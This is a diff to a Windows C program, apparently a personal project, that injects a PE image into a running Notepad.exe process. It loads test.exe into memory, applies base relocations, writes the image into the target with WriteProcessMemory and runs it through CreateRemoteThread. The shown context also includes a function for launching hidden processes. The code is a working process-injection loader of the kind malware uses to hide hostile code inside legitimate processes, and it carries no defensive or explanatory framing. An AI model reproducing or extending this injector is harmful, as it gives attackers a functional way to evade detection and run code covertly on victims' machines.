@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <tlhelp32.h>
 #include <stdio.h>
+#include <stdlib.h>
 
 typedef struct BASE_RELOCATION_ENTRY {
     USHORT Offset : 12;
@@ -65,18 +66,56 @@ void LaunchHiddenProcess(const char *processName) {
     }
 }
 
+PVOID LoadTestExeIntoMemory(const char *exePath) {
+    // Load the executable into memory without resolving its dependencies or executing its entry point
+    HMODULE hModule = LoadLibraryEx(exePath, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    if (hModule == NULL) {
+        fprintf(stderr, "LoadLibraryEx failed, error: %lu\n", GetLastError());
+        return NULL;
+    }
 
-
+    // The base address of the loaded module (test.exe) in the current process's memory
+    return (PVOID)hModule;
+}
 
 int main() {
+    LPCSTR filename = ".\\test.exe";
 
-    PVOID imageBase = GetModuleHandle(NULL);
+    //PVOID imageBase = GetModuleHandle(NULL);
+    PVOID imageBase = LoadTestExeIntoMemory(filename);
+    //PVOID imageBase = (PVOID)0x00007FF7ED3D0000;
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
     PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);
+    //PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)0x00007FF7ED3D0080;
+
+    /*
+    printf("SizeOfCode: %p\n", ntHeader->OptionalHeader.SizeOfCode);
+    printf("Entry Point: %p\n", ntHeader->OptionalHeader.AddressOfEntryPoint);
+    printf("BaseOfCode: %p\n", ntHeader->OptionalHeader.BaseOfCode);
+    printf("ImageBase: %p\n", ntHeader->OptionalHeader.ImageBase);
+    printf("DLLCharacteristics: %p\n", ntHeader->OptionalHeader.DllCharacteristics);
+    printf("SizeOfImage: %p\n", ntHeader->OptionalHeader.SizeOfImage);
+
+    // Get the data directory
+    PIMAGE_DATA_DIRECTORY dataDirectory = ntHeader->OptionalHeader.DataDirectory;
+
+    printf("Data Directories:\n");
+
+    for (int i = 0; i < IMAGE_NUMBEROF_DIRECTORY_ENTRIES; ++i) {
+        // Each entry in the DataDirectory array
+        PIMAGE_DATA_DIRECTORY entry = &dataDirectory[i];
+
+        printf("Directory %d:\t", i);
+        printf("  Virtual Address: 0x%08X\t", entry->VirtualAddress);
+        printf("  Size: 0x%08X\n", entry->Size);
+    }
+    */
+    //FreeLibrary((HMODULE)imageBase);
 
     PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
-    memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);
-
+    if(!memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage)) {
+        FreeLibrary((HMODULE)imageBase);
+    }
     DWORD pid = get_pid_by_name("Notepad.exe");
 
     if (pid == 0) {
@@ -109,15 +148,23 @@ int main() {
     }
     printf("End Relo!\n");
     if (!WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL)) {
+        FreeLibrary((HMODULE)imageBase);
         VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
         CloseHandle(targetProcess);
         VirtualFree(localImage, 0, MEM_RELEASE);
         return 1;
     }
-    printf("%lu\n", (DWORD_PTR)InjectionEntryPoint - (DWORD_PTR)imageBase);
-    DWORD_PTR injectionEntryPointAddress = (DWORD_PTR)InjectionEntryPoint + deltaImageBase;
+
+    DWORD_PTR injectionEntryRVA = 0x5200;
+    DWORD_PTR entryAddress = ntHeader->OptionalHeader.AddressOfEntryPoint;
+    DWORD_PTR finalAddress = (DWORD_PTR)imageBase + entryAddress;
+
+    printf("Entry Address: %p\n", finalAddress);
+
+    DWORD_PTR injectionEntryPointAddress = finalAddress + deltaImageBase;
     HANDLE remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)injectionEntryPointAddress, NULL, 0, NULL);
     if (remoteThread == NULL) {
+        FreeLibrary((HMODULE)imageBase);
         VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
         CloseHandle(targetProcess);
         VirtualFree(localImage, 0, MEM_RELEASE);
@@ -125,9 +172,10 @@ int main() {
     }
 
     WaitForSingleObject(remoteThread, INFINITE);
-    //Sleep(5000);
+    Sleep(5000);
 
     CloseHandle(remoteThread);
+    FreeLibrary((HMODULE)imageBase);
     VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
     CloseHandle(targetProcess);
     VirtualFree(localImage, 0, MEM_RELEASE);
